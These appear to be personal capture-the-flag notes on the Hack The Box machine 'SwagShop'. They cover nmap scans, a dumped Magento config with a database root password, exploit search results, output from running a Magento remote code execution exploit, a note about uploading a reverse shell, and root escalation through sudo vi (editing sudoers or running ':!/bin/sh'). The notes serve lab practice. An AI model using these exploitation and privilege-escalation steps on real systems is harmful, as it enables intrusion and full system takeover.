@@ -1,0 +1,121 @@
+kali@kali:~/go/bin$ nmap -sC -sV 10.10.10.140
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:05 EDT
+Nmap scan report for 10.10.10.140
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Home page
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+kali@kali:~/go/bin$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.140
+[sudo] password for kali: 
+Sorry, try again.
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:06 EDT
+Warning: 10.10.10.140 giving up on port because retransmission cap hit (0).
+Warning: 10.10.10.140 giving up on port because retransmission cap hit (0).
+Nmap scan report for 10.10.10.140
+Host is up (0.15s latency).
+Not shown: 985 open|filtered ports, 690 closed ports, 323 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+
+
+
+<config><global><install><date>Wed, 08 May 2019 07:23:09 +0000</date></install><crypt><key>b355a9e0cd018d3f7f03607141518419</key></crypt><disable_local_modules>false</disable_local_modules><resources><db><table_prefix></table_prefix></db><default_setup><connection><host>localhost</host><username>root</username><password>fMVWh7bDHpgZkyfqQXreTjU9</password><dbname>swagshop</dbname><initStatements>SET NAMES utf8</initStatements><model>mysql4</model><type>pdo_mysql</type><pdoType></pdoType><active>1</active>
+
+
+eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                  | php/webapps/38573.txt
+eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)       | php/webapps/38651.txt
+Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scri | php/webapps/32808.txt
+Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Sit | php/webapps/32809.txt
+Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                     | php/webapps/32810.txt
+Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                | php/webapps/39838.php
+Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                  | php/webapps/37811.py
+Magento eCommerce - Local File Disclosure                                                     | php/webapps/19793.txt
+Magento eCommerce - Remote Code Execution                                                     | xml/webapps/37977.py
+Magento Server MAGMI Plugin - Multiple Vulnerabilities                                        | php/webapps/35996.txt
+Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                   | php/webapps/35052.txt
+Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                  | php/webapps/48135.php
+
+
+there's multiple ones, based on it's 2014, we pretty sure it's under 2.0, check the github, it's 2016 with 2.0
+
+
+Magento eCommerce - Remote Code Execution                                                     | xml/webapps/37977.py
+
+this need to modify the path with index.php, otherwise won't work
+
+then we have the admin login
+
+Magento eCommerce - Remote Code Execution                                                     | xml/webapps/37977.py
+
+
+this need a lot of work to get it working
+
+the form is broken and the 7d data is empty need to change to 2y
+
+
+
+kali@kali:/tmp$ python 37811.py "http://10.10.10.140/index.php/admin" "ls -al"
+<Browser visiting http://10.10.10.140/index.php/admin
+ selected form:
+ <post http://10.10.10.140/index.php/admin application/x-www-form-urlencoded
+  <HiddenControl(form_key=E8ovjKgndfPjfYIO) (readonly)>
+  <TextControl(login[username]=forme)>
+  <TextControl(dummy=)>
+  <PasswordControl(login[password]=forme)>
+  <SubmitControl(<None>=Login) (readonly)>>
+>
+total 728
+drwxr-xr-x 12 www-data www-data   4096 Jul 26 22:12 .
+drwxr-xr-x  3 root     root       4096 May  8  2019 ..
+-rw-r--r--  1 www-data www-data   5667 May  7  2014 .htaccess
+-rw-r--r--  1 www-data www-data   4568 May  7  2014 .htaccess.sample
+-rw-r--r--  1 www-data www-data  10679 May  7  2014 LICENSE.html
+-rw-r--r--  1 www-data www-data  10410 May  7  2014 LICENSE.txt
+-rw-r--r--  1 www-data www-data  10421 May  7  2014 LICENSE_AFL.txt
+
+
+upload reverse shell, then get in
+
+cat user
+
+
+www-data@swagshop:/home/haris$ sudo -l
+Matching Defaults entries for www-data on swagshop:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+hack vi are interesting
+
+we can vi /var/www/html/../../../etc/sudoers
+
+and change it to 
+
+www-data ALL=(ALL) NOPASSWD:ALL
+
+or use vi to open any file
+
+sudo vi /var/www/html/xxx
+then into the command mod and run sh
+:!/bin/sh
+
+get root
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
